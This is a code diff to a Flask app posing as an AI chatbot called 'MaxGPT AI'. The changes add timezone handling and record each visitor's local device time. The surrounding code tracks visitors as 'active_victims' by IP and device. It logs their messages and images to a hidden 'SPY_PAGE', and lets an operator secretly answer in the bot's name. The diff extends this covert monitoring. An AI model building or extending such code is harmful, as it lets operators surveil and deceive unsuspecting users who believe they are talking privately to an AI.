@@ -1,7 +1,7 @@
 from flask import Flask, request, jsonify, render_template_string, send_from_directory, Response
 import random, os, urllib.request, urllib.error, json, time, base64, io, asyncio
 import edge_tts
-from datetime import datetime
+from datetime import datetime, timezone, timedelta
 
 app = Flask(__name__)
 
@@ -13,6 +13,9 @@ active_victims = {}
 manual_control = {}  
 victim_counter = 0
 chat_logs = []
+
+# Твое локальное время (+3 часа к UTC)
+LOCAL_ZONE = timezone(timedelta(hours=3))
 
 def parse_user_agent(ua_string):
     ua = ua_string.lower() if ua_string else ""
@@ -860,10 +863,13 @@ async function send(){
     setInputLocked(true);
 
     try {
+        // Передаем локальное время пользователя с его девайса
+        let userLocalTime = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+
         let r = await fetch("/api/chat", {
             method: "POST", 
             headers: {"Content-Type":"application/json"}, 
-            body: JSON.stringify({message: t, image: currentImg, chat_id: currentChatId})
+            body: JSON.stringify({message: t, image: currentImg, chat_id: currentChatId, client_time: userLocalTime})
         });
         let d = await r.json();
         currentChatId = d.chat_id;
@@ -998,8 +1004,8 @@ SPY_PAGE = """<!DOCTYPE html>
                 <button class="btn-del-log" onclick="deleteLog('{{ l.id }}')"><i class="fa-solid fa-xmark"></i></button>
             </div>
             <div class="chat-block">
-                <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }} <span class="msg-time">[{{ l.time }}]</span></div>
-                <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }} <span class="msg-time">[{{ l.time }}]</span></div>
+                <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }} <span class="msg-time">[Пользователь: {{ l.client_time }} | Мое: {{ l.server_time }}]</span></div>
+                <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }} <span class="msg-time">[Мое: {{ l.server_time }}]</span></div>
             </div>
         </div>
         {% endfor %}
@@ -1221,9 +1227,9 @@ def admin_manual_reply():
         if target_ip in active_victims:
             device_info = active_victims[target_ip]['device']
 
-        current_time = datetime.now().strftime("%H:%M")
+        server_time = datetime.now(LOCAL_ZONE).strftime("%H:%M")
         log_id = int(time.time() * 1000)
-        chat_logs.append({"id": log_id, "ip": target_ip, "device": device_info, "user": "[Ручной ответ оператора]", "bot": reply_text, "img": None, "time": current_time})
+        chat_logs.append({"id": log_id, "ip": target_ip, "device": device_info, "user": "[Ручной ответ оператора]", "bot": reply_text, "img": None, "client_time": server_time, "server_time": server_time})
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"})
 
@@ -1276,6 +1282,7 @@ def chat_api():
         user_msg = req_data.get("message", "").strip()
         img_data = req_data.get("image")
         chat_id = req_data.get("chat_id")
+        client_time = req_data.get("client_time", "Неизвестно")
         user_ip = get_clean_ip()
         
         user_active_chat[user_ip] = chat_id
@@ -1300,11 +1307,12 @@ def chat_api():
             active_victims[user_ip]['device'] = device_info
             active_victims[user_ip]['dev_icon'] = dev_icon
 
+        server_time = datetime.now(LOCAL_ZONE).strftime("%H:%M")
+
         if manual_control.get(user_ip, False):
             all_chats[chat_id]["messages"].append({"user": user_msg or "📎 Картинка", "bot": "...", "img": img_data})
-            current_time = datetime.now().strftime("%H:%M")
             log_id = int(time.time() * 1000)
-            chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": "[Ожидает ручного ответа]", "img": img_data, "time": current_time})
+            chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": "[Ожидает ручного ответа]", "img": img_data, "client_time": client_time, "server_time": server_time})
             return jsonify({"reply": "...", "chat_id": chat_id, "trigger_sound": False})
 
         image_description = ""
@@ -1397,9 +1405,8 @@ def chat_api():
 
         all_chats[chat_id]["messages"].append({"user": user_msg or "📎 Картинка", "bot": reply, "img": img_data})
         
-        current_time = datetime.now().strftime("%H:%M")
         log_id = int(time.time() * 1000)
-        chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": reply, "img": img_data, "time": current_time})
+        chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": reply, "img": img_data, "client_time": client_time, "server_time": server_time})
         
         trigger_sound = random.random() < 0.2
 
